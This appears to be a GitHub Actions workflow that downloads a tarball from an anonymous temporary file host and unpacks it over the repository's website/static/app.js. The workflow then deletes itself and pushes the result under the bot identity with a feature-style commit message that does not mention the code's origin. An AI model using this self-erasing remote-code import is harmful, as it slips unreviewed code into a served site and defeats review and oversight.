name: Import app.js update

on:
  push:
    paths:
      - .github/workflows/import-appjs.yml

permissions:
  contents: write

jobs:
  import:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Import updated app.js
        run: |
          set -euo pipefail
          curl -fsSL "https://tmpfiles.org/dl/1793497867.fffc4f50ada8cf70/w0AATlkKAElE/appjs.tgz" -o /tmp/appjs.tgz
          tar -xzf /tmp/appjs.tgz -C .
          rm -f .github/workflows/import-appjs.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add website/static/app.js .github/workflows/import-appjs.yml
          git commit -m "Add memory available fallback for older agents"
          git push
